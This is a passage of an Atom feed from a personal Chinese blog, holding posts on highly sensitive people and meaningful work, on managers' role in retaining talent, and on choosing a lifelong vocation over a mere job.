&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体; font-size: 13px;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;;font-size: 13px;&quot;&gt;因为全世界只有20%的人具有高敏感性，其余的人并没有通过我们的眼睛来观察这个世界，因此我们经常被认为与众不同或负有过错。有些高敏者很幸运，成长在一个仁慈的家庭中，家庭成员并没有因为高敏感性而责备他们。但高敏者在孩提时代往往会经常受到指摘，这种烙印会一直伴随他们到成年，使他们因为与众不同而感到羞愧。高敏者在成长过程中有可能会和别人感觉不一样，跟不上潮流，而且还有可能认为自己什么地方出了问题。实际上，我们中的绝大部分会认为不适应社会，和别人有所不同。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;;font-size: 13px;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;;font-size: 13px;&quot;&gt;克服最初的羞愧感（即认为自己与众不同的消极信念）是非常重要的。只要这种羞愧感存在，高敏者们就倾向于一种&quot;习得的无助&quot;(learned help lessness)。这就是为什么我们有时候表现出来的并不是真正的自己。&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;想象一位高敏者，就像你自己一样，在一个现代的工作场所，每个工作者就像机器上的一个零件一样，在这样的地方，创造力是不太容易被接受的。一些高敏者换过很多工作。我们的好奇心，我们对于工作的迅速上手，我们对于挑战的渴望，以及压抑厌烦的工作带来的不适，使得我们难以在一个地方长久待下去。对一些人来说，这不啻是一种失败，不但是因为不能在一个地方待足够长的时间（当然也就没有升迁以获得承认的机会），而且因为不能很好地处理好工作。&quot;这只是一项工作，你为什么不能坚持到底呢？&quot;这听上去是不是很熟悉？&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;;font-size: 13px;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;;font-size: 13px;&quot;&gt;高敏者们极其渴望做有意义的工作，我称之为可以带来&quot;精神收获&quot;的工作。这类工作可以得到别人的欣赏，或者为别人做出贡献。如果没有这种精神收获，工作就是一个巨大的负担，甚至好像监狱一样。当我们为工作而工作的时候，我们不停地尝试，希望下一个比前一个要好，时间会长一些。朋友们，让我们面对现实吧，为工作而工作的态度是不行的。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;高感觉寻求者(high sensation seekers), 指的是那些很容易被新鲜事物所吸引的人，与之相反，低感觉寻求者(low sensation seekers)指的是那些不太容易被诱惑的人。阿伦医生说，寻求感觉必须用我们头脑中接受新事物的那一部分来进行。为了生存，我们需要时刻准备好避免或者接受变化。高级智能生物通过学习，会知道一件新鲜事物对我们是福是祸。&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;高敏感者们可能是不同的感觉寻求者，困难的是如何去进行运用。当涉及体育或其他身体活动的时候，一些高敏者是高感觉寻求者。但生活不仅仅是蹦极，感觉寻求还是一种情感或者智能活动。一些高敏者需要很多刺激，需要对很多事情进行注意、思考或想象。一些需要同时进行很多事情--从继续教育的课程到整理档案系统等等。一个高敏者已经在一项工作上待了２０年，同时还保持了多年的对许多事物的兴趣。一些高感觉寻求者会对一个新的主意、一件新鲜事物迅速地产生兴奋甚至狂热。我还记得当高二时拥有自己的第一台电脑的时候，我兴奋之极，好像成了一块要去吸收水分的海绵，而且一刻也不能等待。至今我仍然感激父母的仁慈与英明，在家庭负担很重的情况下，能够买了这台电脑给我，使我习得无数，并快乐无比。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;很多是高感觉寻求者的高敏者们很容易给自己过多的压力。因此，调节自己的热情是非常重要的，这样才能不使自己压力过大以致不堪重负。认识到我们的紧张和不安于现状之间存在着区别，这是需要时间和反思的。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;伊莱恩·阿伦指出，我们喜欢学习新鲜事物，但并不总是希望从事这些事情，因为这需要很多不同的技能，而且会把我们置于一个不能控制的环境中。感觉寻求会成为一种习惯。因此，这也提示我们可以改变习惯来调节我们的热情，以避免我们负担过重以致精疲力竭。因此我们也许应该了解“习得的乐观和无助”是什么？&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;取得人生的成功，实现我们工作如意的梦想，创造我们喜欢的工作，都需要有乐观主义精神。每一位领导者，每个成功人士，每个追寻并实现自己梦想的人，都道出了同样的真谛：你必须相信自己，相信自己能够做到。你需要学着去乐观地面对。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;我认为，最关键的前提是:发现真正适合你的工作并不在于发现工作本身，而在于发现你自己，慢慢成长和成熟起来，并乐于接受你自己。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;部分参考资料提到的对作为高敏者的我们提出的忠告：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;你应该保护自己，防止情感、精神和想象所引起的过度兴奋&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;你应该遏制由于他人的因素而产生的大量思绪；注意掌握好原则&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;你应该识别出自己的高感觉寻求习惯，及其如何影响我们的日常生活，将我们带入过度兴奋状态&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;你应该欣赏自己做事情一板一眼、按部就班的方式&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;第一步：接受你的敏感性&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;第二步：欣赏自己的成果
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;第三步：了解和容忍自己的极限
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;第四步：和别人交流自己的限度
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;参考资料：&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;1. 《跳槽也不是办法》，杰格尔. &lt;/span&gt;&lt;a href=&quot;http://www.douban.com/subject/1723716/&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;http://www.douban.com/subject/1723716/&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;2. 《敏感的人：如何面对外部压力》， 伊莱恩.N.伦. &lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;a href=&quot;http://www.douban.com/subject/1085007/&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;http://www.douban.com/subject/1085007/&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;3. &lt;/span&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Highly_sensitive_person&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;http://en.wikipedia.org/wiki/Highly_sensitive_person&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;4. &lt;/span&gt;&lt;a href=&quot;http://samsara.ihostyou.com/highly-sensitive-person/&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;http://samsara.ihostyou.com/highly-sensitive-person/&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;5. &lt;/span&gt;&lt;a href=&quot;http://www.joyful-work-for-sensitive-people.com/&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;http://www.joyful-work-for-sensitive-people.com/&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>管理者的素质是留住人才的重要因素</title>
   <link href="http://hackfisher.github.com/blog/2008/12/management-quality-personnel"/>
   <updated>2008-12-29T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2008/12/management-quality-personnel</id>
   <content type="html">有很多创业型公司苦于寻找真正的人才，这样的人才能为公司带来正真的提升，帮助公司成长壮大。但是这些公司的管理者真的准备好了接纳这些人才吗？
&lt;div&gt;
&lt;div&gt;许多创业的小公司的管理者苦于找不到好的人才，抱怨说是由于资金不足，不能给予人才相应的报酬，以此为借口来为自己开脱责任。可是真的有可塑之才来到他们身边来是，他们真正做好接受他们并留住他们的准备了吗，他们有足够的智慧和气度留住那些对于企业发展壮大至关重要的人吗？难说。&lt;/div&gt;
&lt;div&gt;都说物以群分，人以类聚，其实很有道理，如果你自身的能力没有达到，那么期望别人跟着你的最起码的资本便没有了。这样，管理者的素质就成了成功道路上必须跨越的一道门槛，所以无论是老板还是员工，不断的提升自己，才是正确的做法，只懂得抱怨老板的员工不是好员工，因为他只知道抱怨，而放弃了脚踏实地努力追求适合自己环境的机会，同样的，无法用自己的智慧和气度留住人才，不重视员工的老板，也用自己的傲慢为代价，丧失了成功的机会。&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>职业并不重要，重要的是事业</title>
   <link href="http://hackfisher.github.com/blog/2008/12/occupational-cause"/>
   <updated>2008-12-09T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2008/12/occupational-cause</id>
   <content type="html">&lt;div&gt;我是谁?我是做什么的？&lt;/div&gt;
&lt;div&gt;我是Fisher，职业是Java程序员，看标题你就会猜到我是做什么的了。职业是什么并不重要，更多的时候它只是一个饭碗，衣食保障。天哪，衣食保障不重要，还有什么是重要的？且慢，我说的不重要是相对而言的，如果你的目标仅仅停留在一个职业上，那你永远也走不远，真正聪明的人懂得拿什么作为选择的依据，从这个角度上来说，依靠事业而不是职业来做出选择，显然要靠谱的多。这就是我最近由于困惑而得来的启发。人的一生中可以有很多个职业，可以在这个公司干完了去另外一家，甚至可以换到各行各业，但是事业只有一个，它是你生命中的精华，意义所在。&lt;/div&gt;
&lt;div&gt;人们往往会在工作中遇到各种各样的困惑，对自己的公司有着各种的抱怨和不满，期望拥有更好的环境，获得更优厚的待遇，遇到更加优秀的领导，在努力工作和跳槽之间徘徊，不断的做着坚持还是放弃的选择，可是始终没有结果，时间在空想和忧虑中慢慢消逝，结果却是由于迫不得已或者冲动，使自己陷入被动之中。&lt;/div&gt;
&lt;div&gt;真的有必要为了职业的问题绞尽脑汁吗？难道工作就非得在忧虑痛苦中度过？工作本身就应该是快乐的，但是要想快乐并非那么容易。只有认清楚了什么是重要的，选择才不会痛苦。一个好的职业规划，应该是事业专一的，而非职业专一，因此更多的时候无需选择，一些以自己的事业是否成长作为目标，进而得出行动的原则。职业是为了事业服务，没有事业你的职业就仅仅是养家糊口的饭碗，仅此无他。&lt;/div&gt;
&lt;div&gt;那么什么才算是事业成功呢？物质的储存，经验的积累，能力的提高，人际关系等等，都包含在里面。一个聪明的人绝对不会因为离开一家公司，跟过去的同事闹翻，因为这完全没有必要。一个聪明的人也不会因为可能会离开一家公司就不好好的努力工作。因为他明白自己并不是为了自己的boss在工作，而是在打造自己的事业。即使老板在待遇上亏待他了，或者和同事不和睦，他也会聪明的做出选择，那就是只要有留下的必要，比如经验，或者学习计划的需要，他就会专心致志的做好自己，而避免让自己陷入胡思乱想之中。一旦继续留下来变得没有必要，并且对自己的事业没有帮助时，他则会经过慎重的选择后，带着自信的笑容和收获的喜悦离开，使自己处于主动的状态，并且在进入新的环境后继续上升而不是重新再来，从而不让自己陷入被动之中。&lt;/div&gt;
&lt;div&gt;做一个快乐勤奋积极的programmer要比做一个辛苦忧虑的码工要好一些，难道不是吗？&lt;/div&gt;
</content>
 </entry>
 
 
</feed>